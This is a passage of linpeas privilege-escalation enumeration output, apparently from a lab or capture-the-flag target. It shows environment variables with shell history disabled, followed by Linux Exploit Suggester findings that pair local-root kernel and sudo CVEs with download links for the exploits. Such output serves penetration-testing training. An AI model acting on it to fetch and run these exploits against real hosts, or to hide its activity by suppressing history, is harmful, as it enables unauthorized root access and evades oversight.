UUID=df519a5f-788a-4510-8e6c-4492ef33f232       /       ext4    errors=remount-ro       0 1                                               
UUID=13e22641-7ee1-41dd-9123-168df0e56f11       none    swap    sw      0 0

╔══════════╣ Environment
╚ Any private information inside environment variables?                                                                                   
HISTFILESIZE=0                                                                                                                            
SHLVL=2
OLDPWD=/home/ryan
HTTP_ACCEPT=*/*
HTTP_HOST=10.10.249.163
_=./linpeas.sh
HISTSIZE=0
PWD=/tmp
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed                                    
dmesg Not Found                                                                                                                           
                                                                                                                                          
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                        
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2015-1328] overlayfs

   Details: http://seclists.org/oss-sec/2015/q2/717
   Exposure: highly probable
   Tags: [ ubuntu=(12.04|14.04){kernel:3.13.0-(2|3|4|5)*-generic} ],ubuntu=(14.10|15.04){kernel:3.(13|16).0-*-generic}
   Download URL: https://www.exploit-db.com/download/37292

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2017-6074] dccp

   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
   Exposure: probable
   Tags: [ ubuntu=(14.04|16.04) ]{kernel:4.4.0-62-generic}
   Download URL: https://www.exploit-db.com/download/41458
   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass

[+] [CVE-2016-2384] usb-midi

   Details: https://xairy.github.io/blog/2016/cve-2016-2384
   Exposure: probable
   Tags: [ ubuntu=14.04 ],fedora=22
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c
   Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user

[+] [CVE-2015-8660] overlayfs (ovl_setattr)

   Details: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
   Exposure: probable
   Tags: [ ubuntu=(14.04|15.10) ]{kernel:4.2.0-(18|19|20|21|22)-generic}
   Download URL: https://www.exploit-db.com/download/39166

[+] [CVE-2015-3202] fuse (fusermount)

   Details: http://seclists.org/oss-sec/2015/q2/520
   Exposure: probable
   Tags: debian=7.0|8.0,[ ubuntu=* ]
   Download URL: https://www.exploit-db.com/download/37089
   Comments: Needs cron or system admin interaction

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2018-1000001] RationalLove

   Details: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/
   Exposure: less probable
   Tags: debian=9{libc6:2.24-11+deb9u1},ubuntu=16.04.3{libc6:2.23-0ubuntu9}
   Download URL: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c
   Comments: kernel.unprivileged_userns_clone=1 required

